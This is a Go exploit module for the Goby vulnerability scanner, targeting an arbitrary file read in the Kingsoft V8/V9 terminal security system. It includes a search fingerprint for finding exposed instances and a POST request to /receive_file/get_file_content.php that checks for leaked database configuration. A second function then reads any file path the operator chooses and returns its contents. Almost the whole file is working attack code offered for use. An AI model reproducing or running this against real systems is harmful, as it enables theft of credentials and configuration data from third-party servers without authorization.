package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Kingsoft V8V9 get_file_content.php Arbitrary File Read",
    "Description": "Kingsoft V8, V9 terminal security system has arbitrary file reading vulnerabilities. Attackers can download arbitrary files in the WEB directory through the vulnerabilities",
    "Product": "Kingsoft V8 V9",
    "Homepage": "https://www.ejinshan.net",
    "DisclosureDate": "2021-07-27",
    "Author": "1291904552@qq.com",
    "GobyQuery": "body=\"金山安全管理\" && title=\"终端安全系统\"",
    "Level": "2",
    "Impact": "<p></p>",
    "Recommandation": "",
    "GifAddress": "https://raw.githubusercontent.com/gobysec/GobyVuls/master/Kingsoft/get_file_content_php/Kingsoft_V8V9_get_file_content_php_Arbitrary_File_Read.gif",
    "References": [
        "https://poc.shuziguanxing.com/?#/publicIssueInfo#issueId=3904"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filepath",
            "type": "createSelect",
            "value": "DFDirect.php,receive_file/get_file_content.php"
        }
    ],
    "ExpTips": null,
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "fileread"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": [
            "Kingsoft V8 V9"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10666",
    "Recommendation": ""
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/receive_file/get_file_content.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type","application/x-www-form-urlencoded; charset=UTF-8")
			cfg.Data ="filepath=DFDirect.php"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody,"mysql:host")&& strings.Contains(resp.Utf8Html,"require_once")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["filepath"].(string)
			uri := "/receive_file/get_file_content.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type","application/x-www-form-urlencoded; charset=UTF-8")
			cfg.Data ="filepath="+cmd
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}


